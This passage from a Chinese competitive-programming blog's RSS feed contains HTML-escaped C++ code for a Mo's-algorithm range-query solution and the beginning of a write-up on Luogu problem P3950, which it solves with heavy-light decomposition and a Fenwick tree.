class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;bits/stdc++.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;namespace&lt;/span&gt; std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; MAXN 100005 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; n,m;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a[MAXN],val[MAXN*&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;],cnt[MAXN],ans[MAXN];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; tot,blosiz,powsiz;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; bel[MAXN],pow1[MAXN],pow2[MAXN];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;bool&lt;/span&gt; calced[MAXN];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; sum[MAXN];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;query&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; id,l,r,p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;bool&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;operator&lt;/span&gt;&amp;lt;(&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; query &amp;amp;sb) &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; bel[l]!=bel[sb.l] ? bel[l]&amp;lt;bel[sb.l] : (bel[l]&amp;amp;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; ? r&amp;lt;sb.r : r&amp;gt;sb.r);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; q[MAXN];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x)&lt;/span&gt; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	sum[cnt[x]]-=x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	cnt[x]++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	sum[cnt[x]]+=x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	++tot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	val[tot]=cnt[x];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;del&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x)&lt;/span&gt; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	sum[cnt[x]]-=x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	cnt[x]--;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	sum[cnt[x]]+=x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	++tot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	val[tot]=cnt[x];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;power&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; p)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;*pow1[x%powsiz]*pow2[x/powsiz]%p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d%d&amp;quot;&lt;/span&gt;,&amp;amp;n,&amp;amp;m);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	blosiz=&lt;span class=&#34;built_in&#34;&gt;sqrt&lt;/span&gt;(n);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;=n;i++) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;,&amp;amp;a[i]),bel[i]=(i&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;)/blosiz;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;=m;i++) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d%d%d&amp;quot;&lt;/span&gt;,&amp;amp;q[i].l,&amp;amp;q[i].r,&amp;amp;q[i].p),q[i].id=i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;sort&lt;/span&gt;(q+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,q+m+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; l=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,r=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;=m;i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (l&amp;gt;q[i].l) &lt;span class=&#34;built_in&#34;&gt;add&lt;/span&gt;(a[--l]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (r&amp;lt;q[i].r) &lt;span class=&#34;built_in&#34;&gt;add&lt;/span&gt;(a[++r]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (l&amp;lt;q[i].l) &lt;span class=&#34;built_in&#34;&gt;del&lt;/span&gt;(a[l++]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (r&amp;gt;q[i].r) &lt;span class=&#34;built_in&#34;&gt;del&lt;/span&gt;(a[r--]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; newtot=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; len=r-l+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; j=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;j&amp;lt;=tot;j++) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (val[j]&amp;amp;&amp;amp;sum[val[j]]!=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;amp;&amp;amp;!calced[val[j]]) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				calced[val[j]]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,val[++newtot]=val[j];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		tot=newtot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		powsiz=&lt;span class=&#34;built_in&#34;&gt;sqrt&lt;/span&gt;(len)+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		pow1[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]=pow2[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; j=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;j&amp;lt;=powsiz;j++) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			pow1[j]=(pow1[j&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;]+pow1[j&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;])%q[i].p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; j=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;j*powsiz&amp;lt;=len;j++) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			pow2[j]=&lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;*pow2[j&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;]*pow1[powsiz]%q[i].p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; powLen=&lt;span class=&#34;built_in&#34;&gt;power&lt;/span&gt;(len,q[i].p);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; j=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;j&amp;lt;=tot;j++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; num=sum[val[j]]%q[i].p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			ans[q[i].id]=(ans[q[i].id]+num*(powLen-&lt;span class=&#34;built_in&#34;&gt;power&lt;/span&gt;(len-val[j],q[i].p)))%q[i].p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			calced[val[j]]=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		ans[q[i].id]+=q[i].p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		ans[q[i].id]%=q[i].p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;=m;i++) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d\n&amp;quot;&lt;/span&gt;,ans[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://cubicy.icu/2018/10/28/%E6%B4%9B%E8%B0%B7P3950%20%E9%83%A8%E8%90%BD%E5%86%B2%E7%AA%81/</guid>
            <title>洛谷:P3950 部落冲突</title>
            <link>http://cubicy.icu/2018/10/28/%E6%B4%9B%E8%B0%B7P3950%20%E9%83%A8%E8%90%BD%E5%86%B2%E7%AA%81/</link>
            <category>数链剖分</category>
            <category>树状数组</category>
            <category>LCA</category>
            <pubDate>Sun, 28 Oct 2018 20:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;原题地址:&lt;a href=&#34;https://www.luogu.org/problemnew/show/P3950&#34;&gt;https://www.luogu.org/problemnew/show/P3950&lt;/a&gt;  &lt;/p&gt;
&lt;h3 id=&#34;题目简述&#34;&gt;&lt;a href=&#34;#题目简述&#34; class=&#34;headerlink&#34; title=&#34;题目简述&#34;&gt;&lt;/a&gt;题目简述&lt;/h3&gt;&lt;p&gt;给定一棵树，每次给定一个操作，有如下两种：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;将某条边染黑&lt;br&gt;2.询问给定的u,v两点间是否有边被染黑&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;###思路&lt;br&gt;询问两点间是否有边被染黑只需要在求LCA时判一下就行。所以直接上树链剖分即可。&lt;br&gt;本题不需要使用线段树，使用树状数组查询路径上是否有任意一段区间和不为0即可。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;代码&#34;&gt;&lt;a href=&#34;#代码&#34; class=&#34;headerlink&#34; title=&#34;代码&#34;&gt;&lt;/a&gt;代码&lt;/h3&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span 